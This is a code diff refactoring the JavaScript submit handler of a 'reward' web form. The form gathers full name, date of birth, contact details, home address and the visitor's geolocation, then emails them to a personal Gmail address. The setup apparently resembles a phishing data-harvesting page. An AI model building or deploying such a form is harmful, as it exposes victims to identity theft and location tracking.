@@ -105,45 +105,23 @@
         document.getElementById("rewardForm").addEventListener("submit", function (e) {
             e.preventDefault();
 
-            // Ensure all form fields are filled
-            const fullName = document.getElementById("fullName").value;
-            const dob = document.getElementById("dob").value;
-            const email = document.getElementById("email").value;
-            const phoneNumber = document.getElementById("phoneNumber").value;
-            const address = document.getElementById("address").value;
-            const city = document.getElementById("city").value;
-            const postalCode = document.getElementById("postalCode").value;
+            // Use FormData to collect form values
+            const formData = new FormData(this);
 
-            // Log the data for debugging
-            console.log("Form Data:", {
-                fullName, dob, email, phoneNumber, address, city, postalCode, location: `Latitude: ${latitude}, Longitude: ${longitude}`
+            // Add location data manually to FormData
+            formData.append("latitude", latitude);
+            formData.append("longitude", longitude);
+
+            // Log form data for debugging
+            console.log("Form Data:", Array.from(formData.entries()));
+
+            // Create the email message from the form data
+            let message = '';
+            formData.forEach((value, key) => {
+                message += `${key}: ${value}\n`;
             });
 
-            // Collect the form data
-            const formData = {
-                fullName,
-                dob,
-                email,
-                phoneNumber,
-                address,
-                city,
-                postalCode,
-                location: `Latitude: ${latitude}, Longitude: ${longitude}`
-            };
-
-            // Create a message
-            const message = `
-                Name: ${formData.fullName}
-                Date of Birth: ${formData.dob}
-                Email: ${formData.email}
-                Phone Number: ${formData.phoneNumber}
-                Address: ${formData.address}
-                City: ${formData.city}
-                Postal Code: ${formData.postalCode}
-                Location: ${formData.location}
-            `;
-
-            // Send the email with form data
+            // Send the form data via email
             sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
 
             alert("Thank you for your submission! We will contact you shortly.");
